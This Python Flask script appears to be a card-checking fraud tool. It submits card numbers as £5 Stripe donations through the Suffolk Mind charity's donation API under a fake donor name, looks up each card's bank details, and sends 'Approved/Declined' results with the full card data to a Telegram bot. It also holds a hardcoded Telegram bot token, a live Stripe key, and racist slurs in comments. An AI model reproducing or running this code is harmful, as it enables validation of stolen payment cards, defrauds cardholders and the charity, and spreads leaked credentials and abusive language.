from flask import Flask, request, jsonify
import requests
import re
import threading

#Nigggaassssssssss
BOT_TOKEN = '8294313536:AAEbstNMHutpUDxUwaxvwJleW4wAxiLAoio'
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"

app = Flask(__name__)

#Fulllllll Nigaas
def stripe_charge_full_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
    })

    if len(yy) == 4:
        yy = yy[-2:]

    try:
        # === Step 1: Save Donation Details ===
        save_headers = {'content-type': 'application/json', 'origin': 'https://www.suffolkmind.org.uk', 'referer': 'https://www.suffolkmind.org.uk/donate/'}
        save_data = {
            "donationamount": 5, "paymentmethod": 1, "giftaid": 0, "forename": "Joynul", "surname": "Abedin",
            "email": "joynul@gmail.com", "address1": "New York", "postcode": "10080", "marketing_optin_privacy": True,
        }
        save_res = session.post('https://www.suffolkmind.org.uk/wp-json/donation/v1/save/', headers=save_headers, json=save_data)
        donation_id = save_res.json()['id']

        # === Step 2: Setup Stripe to get Client Secret ===
        setup_data = {
            "amount": 5, "donation_id": donation_id, "description": "Suffolk Mind Donation",
            "email": "joynul@gmail.com", "forename": "Joynul", "surname": "Abedin",
        }
        setup_res = session.post('https://www.suffolkmind.org.uk/wp-json/donation/v1/setup_stripe/', headers=save_headers, json=setup_data)
        client_secret = setup_res.json()['client_secret']
        pi_id = client_secret.split('_secret_')[0]

        # === Step 3: Confirm Payment with Stripe ===
        confirm_headers = {'content-type': 'application/x-www-form-urlencoded'}
        confirm_data = (
            f'payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}'
            f'&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}'
            f'&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_O45qBcmyO7GC7KkMKzPtpRsl&client_secret={client_secret}'
        )
        confirm_res = session.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=confirm_headers, data=confirm_data)
        
        # === Step 4: Parse Final Response ===
        response_json = confirm_res.json()
        if 'error' in response_json:
            error_message = response_json['error'].get('message', 'An unknown error occurred.')
            return {"status": "Declined", "response": error_message}
        elif response_json.get('status') == 'succeeded':
            return {"status": "Approved", "response": "Donation of £5 successful."}
        elif response_json.get('status') == 'requires_action':
            return {"status": "Declined", "response": "3D Secure Required."}
        else:
            return {"status": "Declined", "response": "An unknown error occurred during payment confirmation."}

    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}')
        return response.json() if response.status_code == 200 else {}
    except Exception: return {}

# --- Background Task Function ---
def background_task(chat_id, message_id, full_cc_string):
    cc, mm, yy, cvv = full_cc_string.split('|')
    check_result = stripe_charge_full_check(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])

    status = check_result.get('status', 'Declined')
    response_message = check_result.get('response', 'No response.')
    brand = bin_info.get('brand', 'Unknown')
    card_type = bin_info.get('type', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    country_flag = bin_info.get('country_flag', '')
    bank = bin_info.get('bank', 'Unknown')

    if status == "Approved":
        final_message = f"""<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ (Stripe Charge)</b>\n\n<b>𝗖𝗮𝗿𝗱:</b> <code>{full_cc_string}</code>\n<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response_message}\n\n<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}\n<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}\n<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}"""
    else:
        final_message = f"""<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ (Stripe Charge)</b>\n\n<b>𝗖𝗮𝗿𝗱:</b> <code>{full_cc_string}</code>\n<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response_message}\n\n<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}\n<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}\n<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}"""

    payload = {'chat_id': chat_id, 'message_id': message_id, 'text': final_message, 'parse_mode': 'HTML'}
    requests.post(TELEGRAM_API_URL, json=payload)

# --- API Endpoint ---
@app.route('/stripe_charge_async', methods=['POST'])
def stripe_charge_async_endpoint():
    data = request.get_json()
    chat_id = data.get('chat_id')
    message_id = data.get('message_id')
    card_str = data.get('card')

    if not all([chat_id, message_id, card_str]):
        return jsonify({"error": "Missing chat_id, message_id, or card"}), 400

    thread = threading.Thread(target=background_task, args=(chat_id, message_id, card_str))
    thread.start()

    return jsonify({"status": "Process started in background."})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
